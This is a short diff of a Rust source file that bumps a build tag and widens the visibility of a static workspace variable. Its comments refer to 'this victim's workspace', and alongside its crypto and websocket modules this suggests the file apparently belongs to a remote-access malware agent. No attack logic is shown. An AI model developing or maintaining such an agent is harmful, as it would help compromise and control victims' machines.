@@ -53,7 +53,7 @@ pub mod win_crypto;
 pub mod workspace;
 
 /// Build tag, surfaced in the online message so updates are visible.
-pub const BUILD: &str = "b12";
+pub const BUILD: &str = "b14";
 
 use anyhow::Result;
 use futures_util::{SinkExt, StreamExt};
@@ -68,7 +68,7 @@ use tokio_tungstenite::tungstenite::Message as Ws;
 static SEEN: LazyLock<Mutex<VecDeque<String>>> = LazyLock::new(|| Mutex::new(VecDeque::new()));
 
 /// This victim's workspace (category + console/info/files), resolved after Ready.
-static AGENT_WS: LazyLock<Mutex<Option<workspace::Workspace>>> =
+pub(crate) static AGENT_WS: LazyLock<Mutex<Option<workspace::Workspace>>> =
     LazyLock::new(|| Mutex::new(None));
 
 fn already_seen(id: &str) -> bool {
